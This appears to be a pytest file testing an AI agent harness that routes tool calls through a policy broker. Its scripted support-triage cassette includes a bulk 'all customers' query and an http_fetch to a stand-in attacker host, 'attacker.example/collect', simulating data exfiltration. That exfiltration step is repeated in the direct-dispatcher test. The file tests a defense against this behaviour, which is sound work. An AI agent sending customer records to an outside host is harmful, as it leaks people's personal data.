import json

import httpx
import pytest

from agent.llm import Cassette
from agent.loop import run_task
from agent.tools import BrokeredDispatcher, DirectDispatcher
from broker.backends import Backends
from mocks.seed_db import seed_customers

CASSETTE = [
    {"type": "tool_use", "tool": "read_document", "args": {"doc_id": "ticket-4711"}},
    {"type": "tool_use", "tool": "read_document", "args": {"doc_id": "kb/refund-policy"}},
    {"type": "tool_use", "tool": "query_customers", "args": {"filter": "id=8812"}},
    {"type": "tool_use", "tool": "query_customers", "args": {"filter": "all"}},
    {"type": "tool_use", "tool": "http_fetch", "args": {"url": "https://attacker.example/collect"}},
    {
        "type": "tool_use",
        "tool": "http_fetch",
        "args": {"url": "https://docstore.internal/feedback"},
    },
    {
        "type": "tool_use",
        "tool": "send_email",
        "args": {"to": ["customer:8812"], "subject": "Your refund", "body": "Processed."},
    },
    {"type": "final", "text": "Ticket triaged; some actions were not permitted."},
]


@pytest.fixture
def cassette(tmp_path):
    path = tmp_path / "support-triage.json"
    path.write_text(json.dumps(CASSETTE))
    return Cassette(path)


def test_cassette_replays_steps_in_order(cassette):
    assert cassette.next_step([])["tool"] == "read_document"
    assert cassette.next_step([])["tool"] == "read_document"
    assert cassette.next_step([])["tool"] == "query_customers"


def test_cassette_replay_is_deterministic(tmp_path):
    path = tmp_path / "c.json"
    path.write_text(json.dumps(CASSETTE))
    first = [Cassette(path).next_step([]) for _ in range(3)]
    second = [Cassette(path).next_step([]) for _ in range(3)]
    assert first == second


def test_brokered_dispatcher_sends_the_token(tmp_path):
    seen = {}

    def handler(request):
        seen["auth"] = request.headers.get("authorization")
        seen["path"] = request.url.path
        return httpx.Response(200, json={"content": "ok", "rows": 0})

    dispatcher = BrokeredDispatcher(
        broker_url="http://broker:8080",
        token="tok-123",
        client=httpx.Client(transport=httpx.MockTransport(handler)),
    )
    dispatcher.call("read_document", {"doc_id": "x"})
    assert seen["auth"] == "Bearer tok-123"
    assert seen["path"] == "/v1/tools/read_document/invoke"


def test_brokered_dispatcher_surfaces_denials_as_data_not_exceptions(tmp_path):
    def handler(request):
        return httpx.Response(
            403, json={"error": "policy_denied", "rule": "egress.pii_sink", "message": "no"}
        )

    dispatcher = BrokeredDispatcher(
        broker_url="http://broker:8080",
        token="tok",
        client=httpx.Client(transport=httpx.MockTransport(handler)),
    )
    result = dispatcher.call("http_fetch", {"url": "https://x.internal/a"})
    assert result["error"] == "policy_denied"
    assert result["rule"] == "egress.pii_sink"


def test_the_loop_runs_every_cassette_step_and_stops_on_final(cassette):
    calls = []

    class RecordingDispatcher:
        def call(self, tool, args):
            calls.append(tool)
            return {"content": "ok", "rows": 0}

    transcript = run_task(RecordingDispatcher(), cassette, task_id="4711")
    assert calls == [
        "read_document",
        "read_document",
        "query_customers",
        "query_customers",
        "http_fetch",
        "http_fetch",
        "send_email",
    ]
    assert transcript[-1]["type"] == "final"


def test_a_denial_does_not_stop_the_loop(cassette):
    class DenyingDispatcher:
        def call(self, tool, args):
            if tool == "http_fetch":
                return {"error": "policy_denied", "rule": "egress.allowlist"}
            return {"content": "ok", "rows": 0}

    transcript = run_task(DenyingDispatcher(), cassette, task_id="4711")
    assert transcript[-1]["type"] == "final"


def test_direct_dispatcher_bypasses_the_broker_entirely(tmp_path):
    seen = {}

    def handler(request):
        seen["url"] = str(request.url)
        return httpx.Response(200, text="raw")

    dispatcher = DirectDispatcher(
        docstore_url="http://docstore.internal",
        db_path=tmp_path / "customers.db",
        mailer_url="http://mailer.internal",
        client=httpx.Client(transport=httpx.MockTransport(handler)),
    )
    dispatcher.call("http_fetch", {"url": "https://attacker.example/collect"})
    assert seen["url"] == "https://attacker.example/collect"


def test_a_dispatcher_transport_failure_does_not_stop_the_loop(cassette):
    class RaisingDispatcher:
        def call(self, tool, args):
            raise RuntimeError("connection refused")

    transcript = run_task(RaisingDispatcher(), cassette, task_id="4711")
    assert transcript[-1]["type"] == "final"


def test_direct_dispatcher_matches_backends_for_the_same_filter(tmp_path):
    db_path = tmp_path / "customers.db"
    seed_customers(db_path, count=120)

    def handler(request):
        return httpx.Response(200, text="unused")

    direct = DirectDispatcher(
        docstore_url="http://docstore.internal",
        db_path=db_path,
        mailer_url="http://mailer.internal",
        client=httpx.Client(transport=httpx.MockTransport(handler)),
    )
    backends = Backends(
        docstore_url="http://docstore.internal",
        db_path=db_path,
        mailer_url="http://mailer.internal",
        client=httpx.Client(transport=httpx.MockTransport(handler)),
    )

    for filter_expr in ("plan=pro", "id=8812"):
        direct_result = direct.call("query_customers", {"filter": filter_expr})
        backend_result = backends.execute("query_customers", {"filter": filter_expr})
        assert json.loads(direct_result["content"]) == json.loads(backend_result.content)
        assert direct_result["rows"] == backend_result.rows
